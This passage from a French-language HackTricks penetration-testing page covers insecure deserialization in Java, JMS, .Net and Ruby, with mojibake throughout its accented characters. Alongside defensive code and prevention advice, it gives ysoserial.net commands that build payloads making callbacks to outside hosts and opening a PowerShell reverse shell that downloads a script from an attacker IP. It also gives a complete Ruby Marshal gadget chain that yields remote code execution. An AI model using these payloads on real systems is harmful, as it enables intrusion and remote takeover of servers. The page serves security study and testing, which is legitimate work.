Certains de vos objets d'application peuvent √™tre contraints d'impl√©menter `Serializable` en raison de leur hi√©rarchie. Pour garantir que vos objets d'application ne puissent pas √™tre d√©s√©rialis√©s, une m√©thode `readObject()` doit √™tre d√©clar√©e (avec un modificateur `final`) qui lance toujours une exception :
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### V√©rifier la classe d√©s√©rialis√©e avant de la d√©s√©rialiser

La classe `java.io.ObjectInputStream` est utilis√©e pour d√©s√©rialiser des objets. Il est possible de renforcer son comportement en la sous-classant. C'est la meilleure solution si :

* Vous pouvez modifier le code qui effectue la d√©s√©rialisation
* Vous savez quelles classes vous attendez √† d√©s√©rialiser

L'id√©e g√©n√©rale est de surcharger [`ObjectInputStream.html#resolveClass()`](https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass\(java.io.ObjectStreamClass\)) afin de restreindre les classes qui sont autoris√©es √† √™tre d√©s√©rialis√©es.

Comme cet appel se produit avant qu'un `readObject()` soit appel√©, vous pouvez √™tre s√ªr qu'aucune activit√© de d√©s√©rialisation n'aura lieu √† moins que le type ne soit celui que vous souhaitez autoriser.

Un exemple simple est montr√© ici, o√π la classe `LookAheadObjectInputStream` est garantie de ne pas d√©s√©rialiser d'autre type que la classe `Bicycle` :
```java
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Renforcer l'utilisation de tous les java.io.ObjectInputStream avec un agent**

Si vous ne poss√©dez pas le code ou ne pouvez pas attendre un correctif, utiliser un agent pour int√©grer le renforcement √† `java.io.ObjectInputStream` est la meilleure solution.\
En utilisant cette approche, vous pouvez uniquement mettre sur liste noire les types malveillants connus et non les mettre sur liste blanche, car vous ne savez pas quels objets sont s√©rialis√©s.

Pour activer ces agents, ajoutez simplement un nouveau param√®tre JVM :
```
-javaagent:name-of-agent.jar
```
Exemple : [rO0 par Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

### R√©f√©rences

* Discussion sur la d√©s√©rialisation et ysoserial : [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Discussion sur gadgetinspector : [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) et diapositives : [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Article sur Marshalsec : [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Article et discussion sur la d√©s√©rialisation JSON en Java et .Net : [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) et diapositives : [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVEs de d√©s√©rialisations : [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Injection JNDI & log4Shell

D√©couvrez ce qu'est **l'injection JNDI, comment l'abuser via RMI, CORBA & LDAP et comment exploiter log4shell** (et un exemple de cette vuln√©rabilit√©) dans la page suivante :

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> L'API **Java Message Service** (**JMS**) est une API middleware orient√©e message Java pour envoyer des messages entre deux clients ou plus. C'est une impl√©mentation pour g√©rer le probl√®me producteur-consommateur. JMS fait partie de la plateforme Java, Enterprise Edition (Java EE), et a √©t√© d√©finie par une sp√©cification d√©velopp√©e chez Sun Microsystems, mais qui est depuis guid√©e par le Java Community Process. C'est une norme de messagerie qui permet aux composants d'application bas√©s sur Java EE de cr√©er, envoyer, recevoir et lire des messages. Elle permet la communication entre diff√©rents composants d'une application distribu√©e d'√™tre faiblement coupl√©e, fiable et asynchrone. (Depuis [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produits

Il y a plusieurs produits utilisant ce middleware pour envoyer des messages :

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### Exploitation

Donc, en gros, il y a **un tas de services utilisant JMS de mani√®re dangereuse**. Par cons√©quent, si vous avez **suffisamment de privil√®ges** pour envoyer des messages √† ces services (g√©n√©ralement vous aurez besoin de credentials valides), vous pourriez √™tre capable d'envoyer **des objets malveillants s√©rialis√©s qui seront d√©s√©rialis√©s par le consommateur/abonn√©**.\
Cela signifie que dans cette exploitation, tous les **clients qui vont utiliser ce message seront infect√©s**.

Vous devez vous rappeler que m√™me si un service est vuln√©rable (parce qu'il d√©s√©rialise de mani√®re non s√©curis√©e les entr√©es utilisateur), vous devez toujours trouver des gadgets valides pour exploiter la vuln√©rabilit√©.

L'outil [JMET](https://github.com/matthiaskaiser/jmet) a √©t√© cr√©√© pour **se connecter et attaquer ces services en envoyant plusieurs objets malveillants s√©rialis√©s en utilisant des gadgets connus**. Ces exploits fonctionneront si le service est toujours vuln√©rable et si l'un des gadgets utilis√©s est pr√©sent dans l'application vuln√©rable.

### R√©f√©rences

* Discussion sur JMET : [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Diapositives : [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net est similaire √† Java en ce qui concerne le fonctionnement des exploits de d√©s√©rialisation : L'**exploit** va **abuser de gadgets** qui **ex√©cutent** du **code int√©ressant lorsqu'un** objet est **d√©s√©rialis√©**.

### Empreinte

#### WhiteBox

Cherchez dans le code source les termes suivants :

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Recherchez tout s√©rialiseur o√π le type est d√©fini par une variable contr√¥l√©e par l'utilisateur.

#### BlackBox

Vous pouvez rechercher la cha√Æne encod√©e en Base64 **AAEAAAD/////** ou toute autre chose qui **peut √™tre d√©s√©rialis√©e** c√¥t√© serveur et qui vous permet de contr√¥ler le type d√©s√©rialis√©\*\*.\*\* Par exemple, un **JSON** ou **XML** contenant `TypeObject` ou `$type`.

### ysoserial.net

Dans ce cas, vous pouvez utiliser l'outil [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) pour **cr√©er les exploits de d√©s√©rialisation**. Une fois le d√©p√¥t git t√©l√©charg√©, vous devriez **compiler l'outil** en utilisant Visual Studio par exemple.

Si vous voulez apprendre **comment ysoserial.net cr√©e ses exploits**, vous pouvez [**consulter cette page o√π est expliqu√© le gadget ObjectDataProvider + ExpandedWrapper + formateur Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Les principales options de **ysoserial.net** sont : **`--gadget`**, **`--formatter`**, \*\*`--output` \*\* et **`--plugin`.**

* **`--gadget`** utilis√© pour indiquer le gadget √† abuser (indique la classe/fonction qui sera abus√©e pendant la d√©s√©rialisation pour ex√©cuter des commandes).
* **`--formatter`**, utilis√© pour indiquer la m√©thode de s√©rialisation de l'exploit (vous devez savoir quelle biblioth√®que est utilis√©e par le serveur pour d√©s√©rialiser le payload et utiliser la m√™me pour le s√©rialiser)
* \*\*`--output` \*\* utilis√© pour indiquer si vous voulez l'exploit en **brut** ou **encod√© en base64**. _Notez que **ysoserial.net** va **encoder** le payload en utilisant **UTF-16LE** (encodage utilis√© par d√©faut sur Windows) donc si vous obtenez le brut et que vous l'encodez juste depuis une console Linux, vous pourriez avoir des **probl√®mes de compatibilit√© d'encodage** qui emp√™cheront l'exploit de fonctionner correctement (dans la box HTB JSON le payload a fonctionn√© en UTF-16LE et en ASCII mais cela ne signifie pas qu'il fonctionnera toujours)._
* \*\*`--plugin` \*\* ysoserial.net prend en charge les plugins pour cr√©er des **exploits pour des frameworks sp√©cifiques** comme ViewState

#### Plus de param√®tres ysoserial.net

* `--minify` fournira un **payload plus petit** (si possible)
* `--raf -f Json.Net -c "anything"` Cela indiquera tous les gadgets qui peuvent √™tre utilis√©s avec un formateur fourni (`Json.Net` dans ce cas)
* `--sf xml` vous pouvez **indiquer un gadget** (`-g`) et ysoserial.net recherchera des formateurs contenant "xml" (insensible √† la casse)

**Exemples ysoserial** pour cr√©er des exploits :
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** a √©galement un **param√®tre tr√®s int√©ressant** qui aide √† mieux comprendre le fonctionnement de chaque exploit : `--test`\
Si vous indiquez ce param√®tre, **ysoserial.net** va **essayer** l'**exploit localement,** afin que vous puissiez tester si votre payload fonctionnera correctement.\
Ce param√®tre est utile car si vous examinez le code, vous trouverez des morceaux de code comme le suivant (extrait de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)) :
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Cela signifie que pour tester l'exploit, le code appellera [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Dans **le code pr√©c√©dent est vuln√©rable √† l'exploit cr√©√©**. Donc, si vous trouvez quelque chose de similaire dans une application .Net, cela signifie probablement que cette application est √©galement vuln√©rable.
Par cons√©quent, le param√®tre **`--test`** nous permet de comprendre **quels morceaux de code sont vuln√©rables** √† l'exploit de d√©s√©rialisation que **ysoserial.net** peut cr√©er.

### ViewState

Jetez un ≈ìil √† [ce POST sur **comment essayer d'exploiter le param√®tre \_\_ViewState de .Net**](exploiting-\_\_viewstate-parameter.md) pour **ex√©cuter du code arbitraire.** Si vous **connaissez d√©j√† les secrets** utilis√©s par la machine victime, [**lisez ce post pour savoir ex√©cuter du code**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### **Pr√©vention**

Ne permettez pas au flux de donn√©es de d√©finir le type d'objet auquel le flux sera d√©s√©rialis√©. Vous pouvez pr√©venir cela en utilisant par exemple le `DataContractSerializer` ou le `XmlSerializer` si possible.

Lorsque `JSON.Net` est utilis√©, assurez-vous que le `TypeNameHandling` est uniquement d√©fini sur `None`.
```
TypeNameHandling = TypeNameHandling.None
```
Si `JavaScriptSerializer` doit √™tre utilis√©, alors ne l'utilisez pas avec un `JavaScriptTypeResolver`.

Si vous devez d√©s√©rialiser des flux de donn√©es qui d√©finissent leur propre type, alors restreignez les types qui sont autoris√©s √† √™tre d√©s√©rialis√©s. Il faut √™tre conscient que cela reste risqu√© car de nombreux types natifs .Net sont potentiellement dangereux en eux-m√™mes. Par exemple :
```
System.IO.FileInfo
```
Les objets `FileInfo` qui r√©f√©rencent des fichiers r√©ellement pr√©sents sur le serveur peuvent, lors de la d√©s√©rialisation, modifier les propri√©t√©s de ces fichiers, par exemple en les rendant en lecture seule, cr√©ant ainsi une attaque potentielle de d√©ni de service.

M√™me si vous avez limit√© les types qui peuvent √™tre d√©s√©rialis√©s, rappelez-vous que certains types ont des propri√©t√©s qui sont risqu√©es. `System.ComponentModel.DataAnnotations.ValidationException`, par exemple, a une propri√©t√© `Value` de type `Object`. Si ce type est le type autoris√© pour la d√©s√©rialisation, alors un attaquant peut d√©finir la propri√©t√© `Value` √† n'importe quel type d'objet de leur choix.

Il faut emp√™cher les attaquants de diriger le type qui sera instanci√©. Si cela est possible, alors m√™me `DataContractSerializer` ou `XmlSerializer` peuvent √™tre d√©tourn√©s, par exemple :
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
L'ex√©cution peut se produire au sein de certains types .Net lors de la d√©s√©rialisation. Cr√©er un contr√¥le comme celui montr√© ci-dessous est inefficace.
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
Pour `BinaryFormatter` et `JSON.Net`, il est possible de cr√©er une forme de contr√¥le de liste blanche plus s√ªre en utilisant un `SerializationBinder` personnalis√©.

Essayez de rester inform√© sur les gadgets de d√©s√©rialisation .Net connus pour leur ins√©curit√© et portez une attention particuli√®re aux types qui peuvent √™tre cr√©√©s par vos processus de d√©s√©rialisation. **Un d√©s√©rialiseur ne peut instancier que les types qu'il conna√Æt**.

Essayez de garder tout code susceptible de cr√©er des gadgets potentiels s√©par√© de tout code ayant une connectivit√© Internet. Par exemple, `System.Windows.Data.ObjectDataProvider` utilis√© dans les applications WPF est un gadget connu qui permet l'invocation de m√©thodes arbitraires. Il serait risqu√© d'avoir une r√©f√©rence √† cet assembly dans un projet de service REST qui d√©s√©rialise des donn√©es non fiables.

### **R√©f√©rences**

* Java et .Net JSON d√©s√©rialisation **article :** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** conf√©rence : [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) et diapositives : [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby dispose de deux m√©thodes pour impl√©menter la s√©rialisation dans la biblioth√®que **marshal** : la premi√®re m√©thode est **dump** qui convertit l'objet en flux de bytes **(s√©rialiser)**. Et la seconde m√©thode est **load** pour convertir le flux de bytes en objet √† nouveau (**d√©s√©rialiser**).\
Ruby utilise HMAC pour signer l'objet s√©rialis√© et sauvegarde la cl√© dans l'un des fichiers suivants :

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Cha√Æne de gadgets de d√©s√©rialisation g√©n√©rique Ruby 2.X vers RCE (plus d'infos sur [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)) :
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
```markdown
Autre cha√Æne RCE pour exploiter Ruby On Rails : [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
